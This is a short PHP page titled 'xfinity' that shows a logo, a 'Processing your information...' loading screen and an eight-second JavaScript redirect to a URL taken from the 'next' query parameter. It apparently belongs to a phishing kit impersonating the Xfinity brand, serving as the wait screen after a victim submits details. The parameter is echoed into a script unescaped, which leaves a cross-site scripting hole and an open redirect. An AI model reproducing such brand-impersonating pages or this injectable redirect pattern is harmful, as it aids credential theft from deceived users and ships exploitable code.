<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>xfinity</title>
  <link rel="stylesheet" href="res/wait.css">
</head>
<body>
<header>
    
    <div class="logo">
        <img src="res/img/logo.png">
    </div>
    </header>
       <main>
        <div class="coun">
            <div class="title">
            <h2>Please wait...</h2>
            <p>Processing your information...</p>
            </div>
            <div class="load">
            <img src="res/img/loading.gif">
            </div>
          

    
</div>
</main>
<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script> 

</body>
</html>
